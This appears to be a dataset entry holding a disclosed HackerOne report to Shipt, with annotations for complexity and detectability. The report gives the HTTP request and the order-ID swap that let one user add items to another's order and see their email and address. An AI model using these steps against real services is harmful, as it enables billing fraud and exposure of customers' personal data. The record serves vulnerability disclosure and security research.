@@ -1,0 +1,48 @@
+{
+    "reported_to": "Shipt",
+    "reported_by": "doomerhunter ",
+    "title": "Improper Access Control + Financial fraud allows attacker to disclose + add arbitrary products to another's user's order ",
+    "content": "\nContext\nThe [\u2588\u2588\u2588\u2588\u2588\u2588) website allows users to place orders and modify them after they were placed.\nTo modify an order after it was placed, it must be in a state before the shopping is in progress. This allows customers to adjust an order before its final shipment\nVulnerability\nIt is possible to add arbitrary products to another's user's order before it was placed. By sending the proper HTTP request, the content of the target order is also disclosed, including the victim user's physical address.\nSteps to reproduce\nPlace two distinct orders, with two different accounts. To simplify the process, place them in the same shop and place the order in the future.\nFor this Proof-of-Concept, the technical values were the following :\nKey\tValue\nAttacker e-mail\t\u2588\u2588\u2588\u2588\u2588\u2588\nVictim e-mail\t\u2588\u2588\u2588\nAttacker order ID\t1813918441\nVictim order ID\t181396149\nFor the sake of simplicity, the adress was set to \u2588\u2588\u2588\u2588\u2588\u2588\u2588 and the shop was CVS (\"store\":{\"store_id\":60,\"store_location_id\":29244,\"metro_id\":210,\"name\":\"CVS\")\nOnce the orders are placed, proceed to step two.\nFor both orders, add a new item to the placed order. An HTTP POST request similar to the one below will be sent :\nCode 993 Bytes\n1POST /aviator/v2/orders/1813918441/add.json?anonymous_id\u2588\u2588\u2588deac090c-2b05-4402-b33f-468060058145\u2588\u2588\u2588\u2588\u2588white_label_key\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588shipt\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588segway_version\u2588\u2588\u2588\u2588\u2588\u25886668a3d631495cebf307423e23a588c5f9d929c1\u2588\u2588\u2588\u2588zip\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588user_id\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588metro_id\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588124\u2588\u2588\u2588\u2588\u2588\u2588\u2588store_id\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258860\u2588\u2588\u2588\u2588\u2588\u2588bucket_number\u2588\u2588\u2588\u2588\u2588\u258872\u2588\u2588\u2588store_location_id\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588platform\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588web HTTP/2\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/\u2588\u2588\u2588\u2588\u2588\u2588\u2588 Firefox/110.0\n4Accept: application/json, text/plain, */*\n5Accept-Language: fr,fr-FR;q\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25880.8,en-US;q\u2588\u2588\u2588\u2588\u25880.5,en;q\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u25880.3\n6Accept-Encoding: gzip, deflate\n7Content-Type: application/json\n8Content-Length: 154\n9Referer: \u2588\u2588\u2588\u2588\u2588\u2588\n10Origin: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n11Sec-Fetch-Dest: empty\n12Sec-Fetch-Mode: cors\n13Sec-Fetch-Site: same-site\n14X-Pwnfox-Color: blue\n15Authorization: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n16Te: trailers\n17\n18{\"zip\":\"\u2588\u2588\u2588\u2588\",\"user_id\":\u2588\u2588\u2588\u2588\u2588,\"metro_id\":124,\"store_id\":60,\"bucket_number\":72,\"store_location_id\":\u2588\u2588\u2588\u2588\u2588\u2588,\"products\":[{\"id\":4799771,\"qty\":1,\"note\":\"\"}]}\nTo perform the exploit, simply replace the order number in the URL with the order number of your victim. For instance here :\n/aviator/v2/orders/1813918441/add.json -- > becomes --> /aviator/v2/orders/181396149/add.json\nThe server will indeed add the selected products in the victim's cart and additionnally disclose the content of the cart and the customer's e-mail address :\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAdditionnally, by targeting other orders numbers, it is possible to disclose the status of orders numbers. For example :\nAn order cannot be updated because shopping is in progress\nCould not retrieve product info (if the shop is different)\nImpact\nThe vulnerability described here has significant impacts on both the customers and the company, as it involves the manipulation of orders and the exposure of sensitive customer information.\nIndeed, the exploit both discloses user's physical address as well as having them billed for unwanted items.\nHowever the business impacts of the vulnerability can go quite beyond this scope. Indeed, customers who fall victim to the attack will be billed for unwanted items, leading to financial loss for them. Additionally, the company may have to issue refunds or compensate customers, resulting in financial losses for the company. Similarly, this could also impact the smooth running of deliveries from an operational point of view.\nFrom a reputational perspective, customers who have been affected by the attack may lose trust in the company and its ability to protect their personal and financial information. This could result in negative reviews, decreased sales, and a damaged reputation for the company.\nFor the physical address, this also adds addtional personal safety concerns.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": 3900,
+    "weaknesses": [
+        "Improper Access Control - Generic"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1715173740,
+    "report_url": "https://hackerone.com/reports/1903322",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "API",
+    "steps": [
+        [
+            1,
+            "Place two distinct orders with two different accounts in the same shop, scheduled for the future."
+        ],
+        [
+            2,
+            "Modify one of the orders by sending an HTTP POST request to add an item, then replace the order ID in the URL with the victim's order ID to add items to their order and disclose their cart contents and email address."
+        ]
+    ],
+    "vuln_description": "The vulnerability allows an attacker to add arbitrary products to another user's order and disclose sensitive information such as the victim's physical address and email by manipulating the order ID in an HTTP request.",
+    "reason": "The attack involves manipulating order IDs in HTTP requests, which is a straightforward process once the structure of the request is understood. However, it requires the attacker to know or guess valid order IDs, which adds a layer of complexity.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "idor_detectable": true,
+    "authnz_byppass_detectable": false,
+    "is_simple_payload": false,
+    "injection_metadata": {
+        "is_simple_payload": false
+    },
+    "authnz_metadata": {
+        "idor_detectable": true,
+        "authnz_byppass_detectable": false
+    }
+}
